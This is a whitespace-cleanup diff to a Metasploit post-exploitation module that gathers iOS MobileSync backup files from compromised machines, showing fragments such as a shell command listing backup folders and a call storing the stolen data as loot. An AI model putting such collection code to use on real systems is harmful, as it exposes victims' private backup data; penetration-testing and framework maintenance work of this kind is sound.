@@ -22,10 +22,10 @@ class Metasploit3 < Msf::Post
 			'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
 			'Description'    => %q{ This module will collect sensitive files from any on-disk iOS device backups },
 			'License'        => MSF_LICENSE,
-			'Author'         => 
+			'Author'         =>
 				[
 					'hdm',
-					'bannedit' # Based on bannedit's pidgin_cred module structure 
+					'bannedit' # Based on bannedit's pidgin_cred module structure
 				],
 			'Version'        => '$Revision$',
 			'Platform'       => ['windows'],
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Post
 
 	#
 	# Even though iTunes is only Windows and Mac OS X, look for the MobileSync files on all platforms
-	# 
+	#
 	#
 	def run
 		case session.platform
@@ -93,10 +93,10 @@ class Metasploit3 < Msf::Post
 		else
 			userdirs = session.shell_command("ls #{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/")
 			if userdirs =~ /No such file/i
-				return 
+				return
 			else
 				print_status("Found backup directory for: #{whoami}")
-				return ["#{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/"] 
+				return ["#{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/"]
 			end
 		end
 
@@ -222,7 +222,7 @@ class Metasploit3 < Msf::Post
 				
 				store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
 				
-				rescue ::Interrupt 
+				rescue ::Interrupt
 					raise $!
 				rescue ::Exception => e
 					print_error("Failed to download #{fname}: #{e.class} #{e}")
